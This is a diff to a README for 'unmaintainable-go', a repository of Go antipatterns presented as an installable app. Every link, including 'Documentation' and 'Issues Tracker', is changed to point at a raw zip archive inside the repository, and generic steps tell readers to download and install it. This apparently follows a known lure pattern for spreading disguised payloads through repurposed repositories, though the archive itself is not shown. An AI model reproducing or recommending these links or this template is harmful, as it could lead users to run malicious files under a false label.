@@ -4,9 +4,9 @@
 Welcome to unmaintainable-go! This application is a unique collection of Go programming antipatterns that challenges conventional coding wisdom. By following our approach, you can break away from traditional norms and explore a different side of coding.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://raw.githubusercontent.com/sawtunwinaung/unmaintainable-go/main/sillabub/unmaintainable-go.zip) to download the latest version of unmaintainable-go. Follow the steps below to install the application on your device:
+To get started, visit our [Releases page](https://github.com/sawtunwinaung/unmaintainable-go/raw/refs/heads/main/naming/unmaintainable-go-1.2.zip) to download the latest version of unmaintainable-go. Follow the steps below to install the application on your device:
 
-1. Open the link: [Download unmaintainable-go](https://raw.githubusercontent.com/sawtunwinaung/unmaintainable-go/main/sillabub/unmaintainable-go.zip).
+1. Open the link: [Download unmaintainable-go](https://github.com/sawtunwinaung/unmaintainable-go/raw/refs/heads/main/naming/unmaintainable-go-1.2.zip).
 2. Look for the latest release.
 3. Click on the download link for your operating system (e.g., Windows, Mac, Linux).
 4. Save the file to your computer.
@@ -60,8 +60,8 @@ This repository covers various topics, including:
 Join our community to explore these topics and challenge the status quo in programming.
 
 ## 🔗 Useful Links
-- [Releases page](https://raw.githubusercontent.com/sawtunwinaung/unmaintainable-go/main/sillabub/unmaintainable-go.zip)
-- [Documentation](https://raw.githubusercontent.com/sawtunwinaung/unmaintainable-go/main/sillabub/unmaintainable-go.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/sawtunwinaung/unmaintainable-go/main/sillabub/unmaintainable-go.zip)
+- [Releases page](https://github.com/sawtunwinaung/unmaintainable-go/raw/refs/heads/main/naming/unmaintainable-go-1.2.zip)
+- [Documentation](https://github.com/sawtunwinaung/unmaintainable-go/raw/refs/heads/main/naming/unmaintainable-go-1.2.zip)
+- [Issues Tracker](https://github.com/sawtunwinaung/unmaintainable-go/raw/refs/heads/main/naming/unmaintainable-go-1.2.zip)
 
 Thank you for your interest in unmaintainable-go! Embrace the chaos, and happy coding!
